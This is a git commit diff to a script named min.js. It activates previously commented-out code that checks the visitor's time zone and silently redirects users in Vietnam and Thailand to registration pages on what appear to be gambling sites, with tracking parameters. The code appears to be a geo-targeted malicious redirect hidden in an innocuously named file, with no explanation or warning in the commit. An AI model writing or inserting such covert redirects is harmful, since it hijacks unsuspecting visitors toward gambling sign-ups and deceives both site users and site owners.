b33212100d4ea959c6ce5feb033ba1c281863734
hai07t <hai07t@gmail.com>
2025-12-03 13:33:27 +0700

    Update min.js

--- min.js
+++ min.js
@@ -1,10 +1,10 @@
-// const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-// if (
-//   userTimeZone === "Asia/Ho_Chi_Minh" || 
-//   userTimeZone === "Asia/Saigon"
-// ) {
-//     window.location.href = "https://www.google.com/";
-// } else if (userTimeZone === "Asia/Bangkok") {
-//     window.location.href = "https://www.google.com/";
-// }
+if (
+  userTimeZone === "Asia/Ho_Chi_Minh" || 
+  userTimeZone === "Asia/Saigon"
+) {
+    window.location.href = "https://www.lwhfu.com/vn/register/?utm_source=Android&utm_medium=download&utm_campaign=slot&utm_id=397364";
+} else if (userTimeZone === "Asia/Bangkok") {
+    window.location.href = "https://www.fun108club.com/th/register/?utm_source=Android&utm_medium=app-download&utm_campaign=signup&utm_id=411451";
+}
